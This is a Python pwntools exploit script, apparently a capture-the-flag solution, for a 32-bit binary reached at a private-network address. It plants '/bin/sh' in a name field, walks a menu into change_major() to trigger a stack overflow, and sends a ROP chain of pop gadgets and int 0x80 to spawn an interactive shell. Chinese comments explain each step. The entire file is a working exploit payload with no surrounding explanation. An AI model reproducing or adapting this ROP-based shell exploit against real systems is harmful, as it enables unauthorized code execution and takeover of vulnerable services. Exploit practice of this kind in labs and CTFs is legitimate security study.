#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("192.168.80.132",30001)

ppppr = 0x08095ff4	#pop eax; pop ebx; pop esi; pop edi; pop ebp; ret
pppr = 0x080733b0	#pop edx; pop ecx; pop ebx; ret
int_80 = 0x08071005	#int 0x80
binsh = 0x080f1a20	#first_name address

payload = 'A'*32		#padding
payload += p32(ppppr)	#pop eax; pop ebx; pop esi; pop edi; ret
payload += p32(0xb)		#eax = 0xb
payload += p32(binsh)	#ebx = &("/bin/sh")
payload += p32(0)		#esi = 0
payload += p32(0)		#edi = 0
payload += p32(0)		#这里由于ppppr中存在一个pop ebp
						#所以需要再压入一个参数来衔接上ret pppr
payload += p32(pppr)	#pop edx; pop ecx; pop ebx; ret
payload += p32(0)		#edx = 0
payload += p32(0)		#ecx = 0
payload += p32(binsh)	#ebx = &("/bin/sh")
payload += p32(int_80)	#int 0x80

io.sendline("/bin/sh")	#first_name里面存储"/bin/sh"
io.sendline('A')		#随便输入
io.sendline('A')		#随便输入
io.sendline('y')		#选y进入函数first_day_corps()
io.sendline('2')		#选项2进入change_major()，触发栈溢出

io.sendline(payload)
io.interactive()

